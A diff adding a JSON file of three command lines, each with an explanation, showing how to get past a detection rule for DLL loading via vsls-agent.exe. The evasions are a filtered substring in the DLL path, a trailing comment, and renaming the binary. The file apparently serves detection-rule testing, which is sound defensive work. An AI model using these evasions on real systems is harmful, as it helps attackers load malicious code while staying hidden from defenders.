@@ -1,0 +1,14 @@
+[
+  {
+    "output": "vsls-agent.exe --agentExtensionPath=C:\\Users\\Public\\Microsoft.VisualStudio.LiveShare.Agent.Exploit.dll",
+    "explanation": "The rule contains a filter that excludes any command line containing the string 'Microsoft.VisualStudio.LiveShare.Agent.'. By naming the malicious DLL or the path to start with this specific string, the execution triggers the filter and is ignored by the detection logic."
+  },
+  {
+    "output": "vsls-agent.exe --agentExtensionPath C:\\Temp\\evil.dll #Microsoft.VisualStudio.LiveShare.Agent.",
+    "explanation": "Since the filter looks for the substring 'Microsoft.VisualStudio.LiveShare.Agent.' anywhere in the command line, adding the string as a comment or trailing metadata (which some parsers or shells ignore but the SIEM sees) effectively nullifies the detection."
+  },
+  {
+    "output": "copy vsls-agent.exe renamed-agent.exe && renamed-agent.exe --agentExtensionPath C:\\evil.dll",
+    "explanation": "The rule relies on the process image name ending in '\\vsls-agent.exe'. By copying the executable to a different filename, the 'selection' criteria for the Image field is no longer met, allowing the use of the suspicious parameter without detection."
+  }
+]
